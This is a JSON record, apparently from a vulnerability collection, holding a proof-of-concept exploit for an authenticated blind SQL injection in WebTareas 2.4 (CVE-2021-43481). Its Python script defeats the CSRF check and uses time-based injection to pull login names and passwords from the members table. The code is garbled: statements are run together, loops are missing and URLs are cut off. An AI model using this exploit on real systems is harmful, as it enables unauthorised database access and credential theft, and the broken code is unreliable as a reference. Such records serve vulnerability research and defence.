{
    "text": "vul_name : WebTareas 2.4 SQL Injection ， vul_cve : CVE-2021-43481 ， vul_poc :  # Exploit Title : WebTareas 2.4 - Blind SQLi ( Authenticated )  ，  # Date : 04/20/2022 ，  # Exploit Author : Behrad Taher ，  # Vendor Homepage :  ，  # Version : < 2.4p3 ，  # CVE : CVE-2021-43481 ，  # The script takes 3 arguments : IP , user ID , session ID ，  # Example usage : python3 webtareas_sqli.py 127.0.0.1 1 4au5376dddr2n2tnqedqara89i ， from bs4 import BeautifulSoup ， ip = sys.argv [ 1 ]  ， id = sys.argv [ 2 ]  ， sid = sys.argv [ 3 ]  ， print ( \"Extracting %s from user with ID : %s\\n\" % ( column , id )  ， extract = \" ，  # This conditional statement will account for variable length usernames ， injection = \"SELECT 1 and IF ( ascii ( substring ( SELECT %s FROM gW8members WHERE id=1 )  , %d , 1 ) =%d , sleep ( 5 )  , 0 )  ; \" % ( column , i , j )  ， url = \" % ip ， GET_cookies = {\"webTareasSID\" : \"%s\" % sid} ， r = requests.get ( url , cookies=GET_cookies )  ，  # Because the app has CSRF protection enabled we need to send a get request each time and parse out the CSRF Token\" ， token = BeautifulSoup ( r.text , features=\"html.parser\" ) .find ( 'input' , {'name' : 'csrfToken'} )  [ 'value' ]  ，  # Because this is an authenticated vulnerability we need to provide a valid session token ， POST_cookies = {\"webTareasSID\" : \"%s\" % sid} ， POST_data = {\"csrfToken\" : \"%s\" % token , \"action\" : \"update\" , \"cd\" : \"Q\" , \"uq\" : \"%s\" % injection} ， start = time.time (  )  ， requests.post ( url , cookies=POST_cookies , data=POST_data )  ， end = time.time (  ) - start ， extract += chr ( j )  ， print ( \"\\033 [ A\\033 [ A\" )  ， print ( extract )  ，  # Modularized the script for login and password values ， sqli ( \"login\" )  ， sqli ( \"password\" ) ",
    "time": "2022.05.11"
}